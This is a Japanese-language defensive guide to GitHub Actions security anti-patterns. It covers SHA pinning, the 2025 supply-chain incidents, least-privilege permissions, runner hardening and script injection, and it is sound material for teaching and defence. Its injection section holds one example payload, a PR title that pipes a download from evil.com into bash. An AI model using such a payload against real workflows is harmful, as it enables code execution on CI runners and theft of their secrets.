# GitHub Actions Security Anti-Patterns

> サプライチェーン攻撃、権限エスカレーション、シークレット漏洩、スクリプトインジェクションの失敗パターン

## 1. サプライチェーンセキュリティ 7 大アンチパターン

| # | アンチパターン | 問題 | 兆候 | 対策 |
|---|-------------|------|------|------|
| **SC-01** | **Tag-Only Pinning（タグのみのpin）** | `uses: actions/checkout@v4`でタグ参照 | タグが攻撃者に書き換え可能、CVE-2025-30066の根本原因 | 40文字フルSHA pin: `@a5ac7e51b41094c92402da3b24376905380afc29` |
| **SC-02** | **No Action Allowlist（アクション許可リストなし）** | 任意のサードパーティアクションを制限なく使用 | 未監査のアクションがシークレットにアクセス | GitHub Organization設定でallowlist有効化 |
| **SC-03** | **No Dependabot for Actions（Actions用Dependabot未設定）** | アクションのバージョン更新を手動管理 | 既知脆弱性のあるアクションが放置 | `.github/dependabot.yml`でgithub-actions ecosystem有効化 |
| **SC-04** | **Artifact Poisoning（アーティファクト汚染）** | PRワークフローで生成したアーティファクトをデプロイに使用 | 信頼されないPRコードからビルドされたバイナリが本番に | PRアーティファクトは検証専用、リリースはメインブランチから再ビルド |
| **SC-05** | **Unaudited Popular Actions（未監査の人気アクション）** | 人気=安全と判断しセキュリティレビューなし | tj-actions/changed-files攻撃: 23,000+リポジトリ影響 | 重要アクションはフォーク+内部管理、定期的なコード監査 |
| **SC-06** | **No SLSA/Sigstore（ビルド来歴なし）** | ビルドアーティファクトの来歴(provenance)を記録しない | ビルドの改ざんを検出できない | `actions/attest-build-provenance`でSLSA来歴生成 |
| **SC-07** | **Unverified Runner Images（未検証ランナーイメージ）** | self-hostedランナーのベースイメージを未検証で使用 | 事前埋め込みマルウェアのリスク | 公式イメージベース、Ephemeralランナー、定期リビルド |

---

## 2. 2025年 実際のインシデント

```
重大インシデント:

  🔴 tj-actions/changed-files (CVE-2025-30066) - 2025年3月:
    → 攻撃者が複数バージョンタグを悪意のあるコミットに書き換え
    → Runner Worker プロセスメモリからシークレットを抽出
    → 23,000+リポジトリに影響、パブリックログでシークレット露出
    → 教訓: タグpinは安全ではない、SHA pinが必須

  🔴 reviewdog/action-setup (CVE-2025-30154) - 2025年3月:
    → tj-actions攻撃と同時期に発覚
    → CISAが緊急アドバイザリ発行
    → 教訓: 複数アクションの同時侵害の可能性

  🔴 GhostAction Campaign - 2025年:
    → 817リポジトリから3,325シークレットを窃取
    → PyPI/npm/DockerHubトークンが流出
    → HTTP POSTで外部エンドポイントに送信
    → 教訓: ネットワークエグレス制御が必要

  🔴 Nx Package (s1ngularity Attack) - 2025年:
    → pull_request_targetトリガー + PRタイトルの未サニタイズ
    → 400+ユーザー/組織、5,500+リポジトリに影響
    → 教訓: pull_request_targetの入力は全て汚染されている
```

---

## 3. 権限・シークレット管理のアンチパターン

| # | アンチパターン | 問題 | 兆候 | 対策 |
|---|-------------|------|------|------|
| **PM-01** | **write-all Permissions（全権限付与）** | `permissions: write-all`またはpermissions未指定（デフォルトread-write） | 侵害時に全リポジトリ操作が可能 | トップレベル`permissions: {}`→ジョブレベルで最小権限付与 |
| **PM-02** | **Job-Wide Secret Scope（ジョブ全体のシークレット）** | シークレットをジョブレベルenvで定義 | 全ステップからシークレットにアクセス可能 | 必要なステップのみにenv/withでスコープ限定 |
| **PM-03** | **Long-Lived Cloud Credentials（長寿命クラウド認証情報）** | AWS_ACCESS_KEY_ID/SECRET_ACCESS_KEYをGitHub Secretsに保存 | 静的認証情報の窃取→長期的なクラウドアクセス | OIDC: `aws-actions/configure-aws-credentials`のrole-to-assume |
| **PM-04** | **Secret in Log（ログのシークレット）** | echo/printでシークレット値を出力 | ワークフローログに認証情報が平文表示 | `::add-mask::$SECRET`使用、ログ出力前のサニタイズ |
| **PM-05** | **No Environment Protection（環境保護なし）** | production環境にprotection rules未設定 | 誰でもproductionデプロイを実行可能 | Required reviewers + wait timer + deployment branches |

---

## 4. スクリプトインジェクションの罠

```
インジェクション攻撃ベクター:

  ❌ PR Title Injection（PRタイトルインジェクション）:
    → run: echo "PR: ${{ github.event.pull_request.title }}"
    → タイトルに "; curl evil.com | bash" で任意コード実行
    → 対策: env: PR_TITLE: ${{ ... }} → run: echo "$PR_TITLE"

  ❌ Issue Body Injection（Issueボディインジェクション）:
    → ${{ github.event.issue.body }}をrun:で直接使用
    → Issue作成者が任意コマンドを埋め込み可能
    → 対策: 環境変数経由 + 入力バリデーション

  ❌ Commit Message Injection（コミットメッセージインジェクション）:
    → ${{ github.event.head_commit.message }}の直接使用
    → コミットメッセージ内のシェルメタ文字で攻撃
    → 対策: 環境変数経由、run: の中で直接展開しない

  ❌ Branch Name Injection（ブランチ名インジェクション）:
    → ${{ github.head_ref }}をcheckoutやコマンドで直接使用
    → 悪意のあるブランチ名で任意コード実行
    → 対策: 環境変数経由 + クォーティング

  ❌ eval() in Scripts（スクリプトでのeval使用）:
    → ワークフロー内のshellスクリプトでevalを使用
    → 間接的なコード実行、デバッグ困難
    → 対策: evalを完全に排除、具体的なコマンド使用
```

---

## 5. ランナーセキュリティのアンチパターン

| # | アンチパターン | 問題 | 兆候 | 対策 |
|---|-------------|------|------|------|
| **RS-01** | **Persistent Self-Hosted Runners（永続self-hostedランナー）** | 実行間で状態が残るランナー | 前のジョブのシークレット/ファイルが残留 | Ephemeralランナー（`--ephemeral`フラグ）必須 |
| **RS-02** | **Public Repo Self-Hosted（パブリックリポジトリでself-hosted）** | パブリックリポジトリにself-hostedランナーを接続 | フォークPRから任意コード実行→ランナーインフラ侵害 | パブリックリポジトリではGitHub-hostedランナーのみ |
| **RS-03** | **No Network Egress Control（ネットワーク制御なし）** | ランナーからの外部通信を制限しない | データ流出（GhostAction: HTTP POSTでシークレット送信） | `step-security/harden-runner`でegress制限 |
| **RS-04** | **Docker Socket Exposure（Dockerソケット露出）** | ランナーのDockerソケットをコンテナに共有 | コンテナからホスト全体にアクセス可能 | Dockerソケット共有禁止、rootlessモード |

---

## 6. Pipe との連携

```
Pipe での活用:
  1. Recon フェーズで SC-01〜07 のサプライチェーンスクリーニング
  2. Orchestrate フェーズで PM-01〜05 の権限設計確認
  3. Test フェーズでインジェクション脆弱性のスキャン
  4. Evolve フェーズでランナーセキュリティ監査

品質ゲート:
  - @tag形式のアクション参照 → SHA pin変換（SC-01 防止）
  - Dependabot未設定 → github-actions ecosystem追加（SC-03 防止）
  - permissions未指定 → `permissions: {}`+ ジョブレベル設定（PM-01 防止）
  - 長寿命クラウド認証情報 → OIDC移行提案（PM-03 防止）
  - ${{}}のrun:直接使用 → env変数経由に変更（Injection 防止）
  - self-hosted on public repo → GitHub-hosted移行（RS-02 防止）
```

**Source:** [Arctiq: Top 10 GitHub Actions Security Pitfalls](https://arctiq.com/blog/top-10-github-actions-security-pitfalls-the-ultimate-guide-to-bulletproof-workflows) · [Wiz: tj-actions Supply Chain Attack](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066) · [Palo Alto Unit42: GitHub Actions Supply Chain Attack](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) · [GitGuardian: GhostAction Campaign](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
